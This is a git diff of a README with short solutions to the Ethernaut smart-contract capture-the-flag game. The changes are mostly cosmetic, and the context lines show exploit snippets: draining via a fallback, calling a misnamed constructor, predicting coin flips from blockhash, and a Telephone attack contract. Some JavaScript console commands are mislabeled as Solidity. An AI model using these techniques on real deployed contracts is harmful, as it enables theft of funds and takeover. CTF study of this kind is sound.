@@ -8,8 +8,8 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 
 [Level 0: Hello Ethernaut](#HelloEthernaut)  
 [Level 1: Fallback](#Fallback)  
-[Level 2: Fallout](#Fallout)  
-[Level 3: Coin Flip](#CoinFlip)
+[Level 2: Fallout](#Fallout)    
+[Level 3: Coin Flip](#CoinFlip)   
 [Level 4: Telephone](#Telephone)
 
 <!---
@@ -49,7 +49,7 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 
 > This level walks you through the very basics of how to play the game.
 
-```js
+```solidity
 // Call the functions in the order as suggested
 > await contract.info()
 < 'You will find what you need in info1().'
@@ -86,7 +86,7 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 > 1. You claim ownership of the contract
 > 2. You reduce its balance to 0
 
-```js
+```solidity
 // First, we contribute some ether:
 await contract.contribute({ value: 5 });
 
@@ -106,7 +106,7 @@ await contract.withdraw();
 
 The contract's constructor is incorrectly titled `Fal1out` instead of `Fallout`. We can call it to claim ownership.
 
-```js
+```solidity
 // Call the function to claim ownership
 contract.Fal1out();
 
@@ -126,20 +126,20 @@ In order to solve, we have a few objectives:
 
 Let's begin with recreating a portion of the `flip()` function. We will replicate useful variables of the original function.
 
-```js
+```solidity
 uint256 lastHash;
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 ```
 
 Now, let's setup the target contract. This supports our first objective.
 
-```js
+```solidity
 CoinFlip public targetContract;
 ```
 
 Next, we will create the constructor to receive our target address (for the deployed instance). This completes our first objective.
 
-```js
+```solidity
 constructor(address _targetAddr) public {
   targetContract = CoinFlip(_targetAddr);
   }
@@ -147,7 +147,7 @@ constructor(address _targetAddr) public {
 
 Let's replicate the remaining essential aspects of the `flip()` function. This completes our second objective.
 
-```js
+```solidity
   function flipSolve() public returns (bool) {
     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
     }
@@ -160,7 +160,8 @@ Let's replicate the remaining essential aspects of the `flip()` function. This c
     bool side = coinFlip == 1 ? true : false;
 ```
 Finally, we will pass the side value into the original contract, ensuring our guess is always correct. This completes our final objective.
-```js
+
+```solidity
 targetContract.flip(side);
 ```
 We patiently call `flipSolve()` 10 times until we have guessed correctly 10 times and solve the level.
@@ -184,7 +185,7 @@ contract HotlineBling {
 
   constructor(address _targetCellPhone) public {
 
-    // Setup deployed instance as attack target
+    // Setup deployed instance as the attack target
     EthernautHotline = Telephone(_targetCellPhone);
   }
     // Execute the attack
